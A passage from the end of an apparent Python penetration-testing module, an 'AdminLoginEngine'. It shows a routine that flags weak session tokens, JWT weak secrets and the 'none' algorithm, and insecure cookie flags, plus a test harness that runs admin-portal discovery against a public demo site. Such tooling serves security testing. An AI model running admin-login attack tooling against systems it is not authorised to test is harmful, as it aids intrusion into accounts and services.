                continue
        
        return None
    
    def _check_token_security(self, token_analysis: Dict) -> List[Dict[str, Any]]:
        """Check token for security issues"""
        issues = []
        
        # Check entropy
        if token_analysis.get('entropy', 0) < 30:
            issues.append({
                'type': 'Low Entropy',
                'severity': 'High',
                'description': f'Token entropy is {token_analysis.get("entropy", 0):.2f}, should be > 50',
                'token_name': token_analysis.get('name')
            })
        
        # Check predictability
        if token_analysis.get('predictable', False):
            issues.append({
                'type': 'Predictable Token',
                'severity': 'High',
                'description': 'Token appears to be predictable or sequential',
                'token_name': token_analysis.get('name')
            })
        
        # Check JWT issues
        if token_analysis.get('is_jwt', False):
            if token_analysis.get('weak_secret'):
                issues.append({
                    'type': 'JWT Weak Secret',
                    'severity': 'Critical',
                    'description': f'JWT signed with weak secret: {token_analysis["weak_secret"]}',
                    'token_name': token_analysis.get('name')
                })
            
            if token_analysis.get('algorithm') == 'none':
                issues.append({
                    'type': 'JWT No Signature',
                    'severity': 'Critical',
                    'description': 'JWT uses "none" algorithm (no signature)',
                    'token_name': token_analysis.get('name')
                })
            
            if token_analysis.get('expired', False):
                issues.append({
                    'type': 'Expired JWT',
                    'severity': 'Medium',
                    'description': 'JWT token is expired',
                    'token_name': token_analysis.get('name')
                })
        
        # Check cookie security
        if token_analysis.get('source') == 'cookie':
            if not token_analysis.get('secure', False):
                issues.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'description': 'Cookie not marked as Secure',
                    'token_name': token_analysis.get('name')
                })
            
            if not token_analysis.get('httponly', False):
                issues.append({
                    'type': 'Cookie Accessible via JavaScript',
                    'severity': 'Medium',
                    'description': 'Cookie not marked as HttpOnly',
                    'token_name': token_analysis.get('name')
                })
        
        return issues

# Test function
async def main():
    """Test the admin login engine"""
    engine = AdminLoginEngine()
    
    target = "https://demo.testfire.net"
    print(f"Testing admin login attacks on: {target}")
    
    # Test admin portal discovery
    print("\n--- Admin Portal Discovery ---")
    portals = await engine.discover_admin_portals(target)
    print(f"Found {len(portals)} potential admin portals:")
    for portal in portals[:5]:
        print(f"  - {portal['url']} (Score: {portal['admin_score']}, Form: {portal['login_form']})")
    
    # Test session token analysis
    print("\n--- Session Token Analysis ---")
    token_analysis = await engine.analyze_session_tokens(target)
    print(f"Found {len(token_analysis['session_tokens'])} session tokens")
    print(f"Found {len(token_analysis['jwt_tokens'])} JWT tokens")
    print(f"Security issues: {len(token_analysis['security_issues'])}")

if __name__ == "__main__":
    asyncio.run(main())